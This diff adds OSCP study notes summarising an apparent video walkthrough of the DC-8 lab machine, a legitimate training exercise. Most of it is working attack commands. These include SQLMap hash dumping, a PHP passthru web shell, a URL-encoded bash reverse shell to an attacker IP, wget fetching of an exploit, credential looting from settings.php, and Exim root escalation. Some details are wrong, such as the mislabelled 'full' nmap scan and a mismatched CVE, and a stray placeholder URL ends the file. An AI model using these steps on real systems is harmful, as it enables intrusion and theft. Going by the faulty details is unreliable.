@@ -1,0 +1,91 @@
+This is a detailed summary of the **DC-8 (Delta Charlie 8) Walkthrough** to serve as comprehensive notes for your OSCP preparation. The process is broken down into the standard penetration testing phases, including the specific tools and commands demonstrated in the video.
+
+***
+
+## ⚠️ Important OSCP Exam Note
+
+The instructor explicitly notes that **SQLMap is NOT permitted** in the OSCP exam. Any SQL Injection must be performed **manually**. The tool was used in the video *for demonstration and efficiency*. Be sure your manual SQLi skills are up to par!
+
+***
+
+## 1. Reconnaissance & Enumeration (Nmap, Wfuzz, Droopscan)
+
+The initial phase focuses on discovering running services, hidden web content, and known vulnerabilities.
+
+### 🔍 Service Discovery (Nmap)
+
+The goal is to find all open ports and determine service versions.
+
+| Action | Command | Output/Notes |
+| :--- | :--- | :--- |
+| **Full Port Scan** | `nmap -p 65535 -sV -sC [Target IP] --open` | **Ports Found:** 22 (SSH - OpenSSH), 80 (HTTP - Apache, **Drupal 7**) |
+| **OS Fingerprinting** | (Manual banner grab or Nmap results) | **Confirmed:** Linux (Debian) |
+
+### 🌐 Web Enumeration (Wfuzz & Droopscan)
+
+The target is running **Drupal 7** on port 80, making web-focused enumeration a priority.
+
+| Tool | Purpose | Command | Finding |
+| :--- | :--- | :--- | :--- |
+| **Wfuzz (Directories)** | Fuzz for hidden directories. | `wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://[Target IP]/FUZZ/ --hc 404` | Standard Drupal structure (e.g., `/admin`, `/user`, `/sites`). |
+| **Wfuzz (Files)** | Fuzz for hidden files. | `wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://[Target IP]/FUZZ --hc 404` | Files like `install.php`, `update.php`. |
+| **Droopscan** | Specifically scans Drupal installations. | `droopscan scan drupal -u http://[Target IP]` | Confirms **Drupal 7.67** and lists themes (`bartik`) and modules. |
+| **Manual Inspection**| View source code and click links. | `View Page Source` & `robots.txt` | Identifies a `/contact` form (input source) and the URL parameter `nid=` on pages like `/node/1`. |
+
+***
+
+## 2. Initial Foothold (SQLi & Reverse Shell)
+
+The foothold is gained by exploiting a SQL Injection vulnerability in the node ID (`nid`) parameter.
+
+### 💥 SQL Injection & Hash Extraction
+
+| Action | Tool | Command/Process | Result/Notes |
+| :--- | :--- | :--- | :--- |
+| **Vulnerability Check**| Manual SQLi / SQLMap | Test the `nid` parameter on `/node/1`. (e.g., `.../node/1'`) | SQLMap confirms **Error-based SQL Injection** on the `nid` parameter. |
+| **Looting** | SQLMap (Demonstration only) | `sqlmap -u "http://[Target IP]/node/1" --dbms=mysql --dump -T users --batch` | Extracts user list and their **Drupal password hashes** for users `admin` and `john`. |
+
+### 🔑 Hash Cracking
+
+| Action | Tool | Command | Result |
+| :--- | :--- | :--- | :--- |
+| **Cracking Hash** | **John the Ripper** | `john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt` | Cracks one user's hash, revealing the password: **`turtle`**. |
+| **User Confirmation** | Manual Login | Navigate to `/user/login` and try `john:turtle`. | **Successful Login!** Gained **authenticated access** as the user `john`. |
+
+### 🐚 Gaining a Reverse Shell
+
+Authenticated access reveals that the content editor allows for **PHP Code** input. This is exploited for Remote Code Execution (RCE).
+
+| Action | Tool | Code/Command | Notes |
+| :--- | :--- | :--- | :--- |
+| **Netcat Listener** | Netcat | `nc -nlvp 3` | Set up a listener on your attacking machine. |
+| **PHP Payload** | Drupal Web Form | `<?php passthru($_GET['offsec']); ?>` | In the 'Contact Us' web form settings, switch the text format to **PHP Code** and insert the payload. |
+| **RCE Trigger** | Browser/Curl | `http://[Target IP]/contact?offsec=id` | Confirms command execution by seeing the `www-data` user ID. |
+| **Reverse Shell** | Browser/Curl | `http://[Target IP]/contact?offsec=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/[ATTACKER_IP]/3%200%3E%261%27` | Send the URL-encoded Bash reverse shell payload to the `offsec` parameter. |
+| **Shell Stabilization** | Shell/Stty | `python -c 'import pty; pty.spawn("/bin/bash")'`; `Ctrl+Z`; `stty raw -echo`; `fg` | Essential steps to get a fully interactive shell on the target machine. |
+
+***
+
+## 3. Privilege Escalation (Exim Local Privilege Escalation)
+
+The final stage involves escalating from the low-privilege web user (`www-data`) to the `root` user.
+
+### 🔍 Post-Exploitation & Enumeration
+
+| Action | Command | Finding |
+| :--- | :--- | :--- |
+| **Looting Database Creds** | `cat sites/default/settings.php` | Finds MySQL credentials: **DB User: `d7_db_user`** (Not explicitly used for LPE, but good loot). |
+| **SUID/SGID Search** | `find / -type f -a \( -perm -u+s -o -perm -g+s \) 2>/dev/null` | Finds the **Exim mail transfer agent** binary with SUID permissions. |
+| **Check Exim Version** | `exim -v` | **Exim Version 4.89**. |
+
+### 🚀 Exim Local Privilege Escalation (LPE)
+
+The Exim version 4.89 is known to be vulnerable to a Local Privilege Escalation exploit (CVE-2016-1531, or similar, up to 4.91).
+
+| Action | Tool | Command/Process | Result |
+| :--- | :--- | :--- | :--- |
+| **Exploit Search** | **Searchsploit** | `searchsploit exim 4.89 local` | Finds the exploit (often a shell script or C code). |
+| **Transfer Exploit** | SimpleHTTPServer | **On Attacker:** `python3 -m http.server 8000` **On Target:** `wget http://[ATTACKER_IP]:8000/exploit.sh` | Downloads the exploit to a writable directory like `/dev/shm`. |
+| **Execution** | Shell | `chmod +x exploit.sh` then `./exploit.sh -m netcat` | Executes the script, which leverages the Exim vulnerability to spawn a root shell. |
+| **Final Proof** | Shell | `whoami`; `id`; `cat /root/flag.txt` | Confirms user is **`root`** (UID 0). **DC-8 Compromised.** |
+http://googleusercontent.com/youtube_content/0
